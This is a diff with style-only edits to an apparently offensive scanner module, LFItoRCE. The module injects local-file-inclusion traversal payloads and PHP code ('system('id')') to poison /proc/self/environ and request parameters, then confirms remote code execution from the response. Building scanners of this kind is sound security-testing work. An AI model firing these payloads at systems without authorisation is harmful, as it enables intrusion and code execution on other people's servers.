@@ -11,6 +11,7 @@ Methods:
 import base64
 import re
 import time
+
 from core.ui import w
 
 
@@ -71,7 +72,7 @@ class LFItoRCE:
     async def _send_lfi(self, base_url: str, param: str, traversal: str,
                          timeout: int = 8) -> dict:
         """Send LFI payload appended to base URL or injected into param."""
-        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+        from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
         # If URL has params, inject; otherwise append as path
         parts = urlparse(base_url)
@@ -154,7 +155,7 @@ class LFItoRCE:
         ]
         found = []
         for pat in patterns:
-            for m in re.findall(pat, source, re.I):
+            for m in re.findall(pat, source, re.IGNORECASE):
                 if m not in found:
                     found.append(m)
         return ", ".join(found[:4]) if found else ""
@@ -221,7 +222,7 @@ class LFItoRCE:
         findings = []
         # Inject the payload with a new marker so we can identify our request
         marker = "VDMT_PROBE"
-        shell = f"<?php system('id');?>"
+        shell = "<?php system('id');?>"
         try:
             await self.engine.ahttp_send(
                 base_url,
@@ -242,8 +243,8 @@ class LFItoRCE:
 
                 # /proc/self/environ includes HTTP_USER_AGENT
                 # If we see our marker + uid output, RCE is confirmed
-                if status == 200 and marker in body:
-                    if any(x in body for x in ["uid=", "gid=", "www-data", "apache"]):
+                if (status == 200 and marker in body
+                        and any(x in body for x in ["uid=", "gid=", "www-data", "apache"])):
                         findings.append({
                             "type": "lfi_rce_proc_environ",
                             "title": "LFI→RCE: /proc/self/environ Poisoning",
@@ -272,7 +273,7 @@ class LFItoRCE:
         poison_params = ["username", "user", "name", "email", "search", "q", "comment"]
         for pp in poison_params:
             try:
-                from urllib.parse import urlparse, urlencode, urlunparse
+                from urllib.parse import urlencode, urlparse, urlunparse
                 parts = urlparse(base_url)
                 poison_url = urlunparse((parts.scheme, parts.netloc, parts.path,
                                          urlencode([(pp, php_code)]), parts.fragment))
